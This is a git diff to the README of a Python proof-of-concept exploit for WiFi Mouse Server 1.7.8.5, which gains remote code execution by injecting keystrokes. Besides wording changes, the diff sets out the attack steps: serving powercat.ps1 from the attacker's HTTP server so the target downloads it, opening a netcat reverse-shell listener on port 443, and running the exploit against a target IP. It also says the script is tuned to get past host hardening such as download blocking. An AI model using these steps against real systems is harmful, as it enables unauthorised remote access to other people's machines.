@@ -1,8 +1,8 @@
-# WiFi Mouse Server 1.7.8.5 - RCE (OSCP Optimized)
+# WiFi Mouse Server 1.7.8.5 - RCE
 
-An optimized Python 3 Proof-of-Concept (PoC) exploit for **WiFi Mouse Server v1.7.8.5**. This script leverages an inherent protocol vulnerability to achieve Remote Code Execution (RCE) via automated keystroke injection. 
+An optimized Python 3 Proof-of-Concept (PoC) exploit for **WiFi Mouse Server v1.7.8.5**. This script leverages an inherent protocol vulnerability to achieve Remote Code Execution (RCE) via automated keystroke injection.
 
-This version has been explicitly modified and tuned for **OSCP-style lab environments** where traditional public exploits fail due to host-hardening constraints (such as restricted `certutil.exe` execution or binary download blocking).
+This version has been explicitly modified and tuned for lab enviroments where traditional public exploits fail due to host-hardening constraints (such as restricted `certutil.exe` execution or binary download blocking).
 
 ## Context & Attributions
 
@@ -26,17 +26,21 @@ http_port = "80"          # Your local HTTP Server Port hosting powercat
 ### Setup Host Listeners
 
 Host `powercat.ps1` on your local attacker machine inside a directory:
+
 ```bash
 python3 -m http.server 80
 ```
 
 In a separate terminal tab, establish your reverse shell listener to configured `lport`:
+
 ```bash
 nc -lvnp 443
 ```
 
 ### Trigger the Exploit
+
 Execute the script against the target machine IP address:
+
 ```bash
 python3 exploit.py <TARGET-IP>
 ```
